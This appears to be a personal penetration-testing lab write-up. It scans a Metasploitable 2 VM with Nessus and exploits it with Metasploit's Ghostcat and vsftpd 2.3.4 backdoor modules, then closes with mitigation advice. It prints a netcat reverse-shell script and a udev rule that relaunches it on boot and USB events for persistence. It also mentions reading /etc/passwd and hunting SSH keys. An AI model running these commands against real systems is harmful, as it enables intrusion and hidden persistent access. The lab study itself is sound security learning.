# Discovery and Exploitation of Vulnerabilities

## Nessus ?

Nessus is a vulnerability assessment platform.
It can be used with or without agents.
It detects OS and network vulnerabilities, and checks large CVE databases for known issues across systems.
It can identify software flows, malware, misconfigs. 
Supports different scoring systems.
Thorough and clear reporting.
It has a vast plugin database.
It uses NASL (Nessus Attack Scripting Language) (similar to Perl/C) for writing custom plugins and scan templates.
[Nessus Wikipedia](https://en.wikipedia.org/wiki/Nessus_(software))
[Tenable Documentation](https://docs.tenable.com/)

## Metasploit ?

Metasploit is a huge framework for penetration testing.
It has a vast library of payloads, with a strong focus on active testing.
Vuln-exploit, post-exploit, privesc and lateral-movement testing. 

## Metasploitable 2

A Rapid7 virtual machine running Ubuntu 8.04, widely known to be vulnerable to numerous attacks.
Running it in a host-only network, using VirtualBox.

May get a "VirtualBox: "Mp-bios bug:8254 timer not connected to io-apic" during installation.
This happens because the emulated IO-APIC by Virtualbox is apparently wrong for this Linux kernel, which causes the VM to hang during boot.
A simple workaround is to use only one CPU core (IO-APIC was initially used to route hardware interrupts to the parallel CPUs), or to add the `noapic` option in the GRUB when booting.
[APIC Wikipedia](https://en.wikipedia.org/wiki/Advanced_Programmable_Interrupt_Controller)
Linux 2.6 was far less forgiving of missing APIC routings, as they assumed a legacy PC interrupt model, and treated newer ones as a hardware defect. VirtualBox APIC emulates a more modern APIC model, which the Linux kernel doesn't handle well, leading to boot hangs or failures.

This virtual machine contains a wide range of tools, databases, open ports, along with backdoors and misconfigs. It’s a good sandbox to start with.

## Debian VM

Typical VM creation, with Nessus and MSF installed, nothing much to say here.

## First scans

Using Nessus on the Debian VM to scan the Metasploitable2.
First, we will start a Host Discovery scan, which in this case reveals basic information.
Since the two VMs are on an isolated network, the scan only discovers my host machine, the Debian VM running Nessus, and the Metasploitable 2 VM.
The Host Discovery scan is mainly ICMP-, TCP-, UDP-, ARP-based. It uses various types of probes to figure out which hosts and devices are alive on the network. It focuses on host availability.

The Basic Network Scan goes further. It uses more probes, active plugins, OS fingerprinting, service enum, vulnerability assessment. If credentials are provided, it can log into systems to spot misconfigurations. It checks for known CVEs and outdated software. 

## Using Metasploit

### Apache Tomcat AJP Vuln

We get our hands on a lot of critical vulnerabilities, an interesting one could be a vuln with Apache Tomcat AJP (AJP is used for request forwarding, it can allow attackers to access local app resources due to bad trust assumptions).

We'll use the msf tomcat_ghostcat plugin
We set RHOSTS, RPORT, and FILENAME, then gain access to the file, which would typically be unreadable without elevated privileges.

### VSFTPd 2.3.4 backdoor

Next, we'll leverage the VSFTPd 2.3.4 backdoor
We use the Metasploit unix/ftp/vsftpd_234_backdoor
We run the Metasploit unix/ftp/vsftpd_234_backdoor module.
This gives us a shell, which we can make interactive with: `python -c 'import pty; pty.spawn("/bin/bash")'`

With an interactive shell, we can now use the su command to impersonate any user.
From here, we can enumerate the users by reading the /etc/passwd file, check for service configurations, and look for private SSH keys...

### Establishing persistence

To establish persistence, we’ll use udev.
Great work done [here](https://ch4ik0.github.io/en/posts/leveraging-Linux-udev-for-persistence/)
By default, udev cannot start reverse shells, so we need to detach the script from its execution, maybe using `at`
For this, we check if at is installed first:
`which at`
Once confirmed, we create the script that will initiate the reverse shell: 'nc -c sh 192.168.64.5 45466' > /opt/scripts/rshell.sh`
Then: `echo 'SUBSYSTEMS=="usb", RUN+="/usr/bin/at -M -f /opt/scripts/rshell.sh now"' > /etc/udev/rules.d/ttp.rules`

Now, at every boot, or everytime an usb device is plugged-in, the reverse shell will initiate towards our attacking host.
To setup the listener: `nc -lvnp 45466`

## Mitigating, Security by Default, Monitoring...

Regularly update software and services. Vulnerabilities get patched frequently, and staying updated reduces the attack surface.
Prevent system bloat with too much different services and open ports, keep things simple. 
Regularly audit network infrastructure itself, topology, permissions, authentication flaws...

Monitor systems: SIEM tools like Wazuh help monitor system logs, detect suspicious activity, and alert about threats.
Use an XDR for proactive defense.
Monitor security sources, news: CSIRT, CERT-FR and threat intelligence providers.
